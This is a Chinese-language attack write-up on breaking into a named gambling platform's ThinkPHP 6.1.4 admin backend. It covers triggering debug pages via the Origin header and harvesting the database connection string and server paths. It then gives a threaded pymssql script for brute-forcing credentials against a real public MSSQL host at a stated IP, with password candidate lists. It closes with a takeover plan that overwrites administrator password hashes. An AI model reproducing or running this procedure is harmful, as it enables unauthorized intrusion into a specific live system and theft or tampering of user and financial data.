# ThinkPHP 调试模式 → 连接串 → 公网数据库凭据探测

来源案例：某 CF 前置博彩平台（自研游戏服 + ThinkPHP 6.1.4 管理面 / channel 面）。

## 1. 制造可控异常，拿调试页

多租户中间件在「拿不到租户配置」时会空指针，这就是最好的触发器。

```
POST https://<channel域>/channelapi/login
Origin: https://<channel域>          # 中间件拿这个头当租户键查库
-> 500，页面 title = ThinkPHP 框架默认异常页，正文含：
   - 出错文件片段（本例 BasicMiddleware.php 的取值/判空逻辑）
   - 完整 $_SERVER dump
   - SQL 面板：每条查询 + 连接信息
```

**要点**：`Origin` 头是浏览器自动带、服务端常忽略的头部 —— 但多租户中间件恰恰用它当键。
换域名打不出异常时，**试试把请求域自身的 Origin 补上**（本次补 `Origin: https://channel.<品牌域>` 后立刻从「来源错误」变成「进到框架内部」）。

## 2. 从调试页抠什么

| 目标 | 在哪 | 后续动作 |
|---|---|---|
| PDO DSN | SQL 面板的连接行 | 提取 `<库名>` 与 `<ip>,<port>`，TCP 连通性测试 |
| `SERVER_ADDR` | `$_SERVER` dump | AWS VPC 内网段（本例 `172.31.x.x`） |
| `DOCUMENT_ROOT` | 同上 | 站点部署路径（本例 `/www/wwwroot/game_admin_php/public`） |
| 框架版本 | 异常页页脚 | 判断有无已知链（本例 TP 6.1.4，**无经典 TP5 RCE**） |
| 真实 SQL | SQL 面板 | 表名/字段/WHERE ⇒ 鉴权模型 |

DSN 形如：`sqlsrv:Database=OM_MasterDB;Server=18.231.63.236,1433` ⇒ 库 `OM_MasterDB`，主机 `18.231.63.236:1433`（MSSQL）。

**注意**：SQL 面板通常只回显 SQL 文本，**不区分参数是绑定还是拼接**。判定必须靠回显行为（见下）。

## 3. 应用面枚举（TP 多应用）

```
GET /<name>/          ->  body 含 "miss app@<name>"   => 应用不存在
GET /adminapi/        ->  404 (框架页)                => 应用存在
GET /channelapi/login ->  500 (框架异常页)            => 应用存在
```
用一句话的差异枚举应用清单；本次额外挖出 `/common`、`/webapi`。
JSON 路由回 `{"code":-100,"message":"unknown request"}` 说明路由表在 PHP 侧，只能词表撞路径。

## 4. 租户键：绑定 vs 拼接的判定

中间件逻辑本质是 `SELECT ... WHERE [tenant_key] = '<请求头>'`。

判定脚本要点：payload 必须**先通过 URL 格式校验**才有意义，否则测的是校验器不是数据库。

```
https://host/?a='            -> 回「无记录」= 参数化绑定（注入死）
                             -> 回 SQL 语法错误 = 字符串拼接（可注入）
<brand>.com  (无 scheme)     -> 回「请求来源错误」= 没到库，测的是校验器
```

**本次结论**：带引号的合法 URL 全回「无记录」⇒ 参数化绑定，Origin → SQL 注入路径正式判死。
不要把「URL 格式校验挡住裸引号」当成「有注入」或「没注入」的证据。

绑定成立后，价值转为**猜对租户键值**：候选池 = 品牌名 × 前缀（channel/admin/agent/www/m/空）× TLD（.com/.bet/.site/.top/.net/.vip）× 路径后缀（/、/index.html 等）。
本次 1152 个候选零命中 ⇒ 该记录不在可猜域内，标死此路。

## 5. 公网 DB 的凭据探测

**环境**（PEP 668 环境装 pymssql 的正确姿势）：

```bash
uv venv /root/mssqlvenv
uv pip install --python /root/mssqlvenv/bin/python pymssql
```

**探测脚本骨架**（线程化，本次把 12 用户 × 1440 口令从 ~2.8 小时压到 ~16 分钟）：

```python
import pymssql, threading
from concurrent.futures import ThreadPoolExecutor

def try_one(user, pwd):
    try:
        pymssql.connect(server="18.231.63.236", port=1433, user=user, password=pwd,
                        database="OM_MasterDB", login_timeout=6, timeout=6)
        return (user, pwd)
    except Exception:
        return None

with ThreadPoolExecutor(max_workers=16) as ex:
    for r in ex.map(lambda c: try_one(*c), combos):
        if r: print("HIT", r); break
```

**候选来源（按命中概率）**：
1. 产品/品牌名 + 常见后缀（`<brand>@123`、`<brand>2024`、`<brand>.com`）；
2. **前端/JS 里泄露过的密钥原样当口令** —— 开发者复用密钥极常见；
3. `sa` + 空口令 / `123456` / `P@ssw0rd`；
4. 库名与用户名同形（`OM_MasterDB`、`om`、`game`、`brmt`）。

**注意**：`pymssql.connect` 的失败异常文本会区分「登录失败」与「网络不可达」——
网络类错误要单独计数，否则会把「端口被限速/丢包」误读成「口令不对」。

## 6. 拿到库之后（本路径的终点）

MSSQL + 平台主库（含玩家/代理/订单/分包配置表）= **全平台接管**：
改管理员口令哈希 → 用已知口令登录后台（会话类目标的最短路径），而不是继续喷弱口令。
写操作前先确认范围与授权边界（本例对资金/绑卡字段只标不测）。
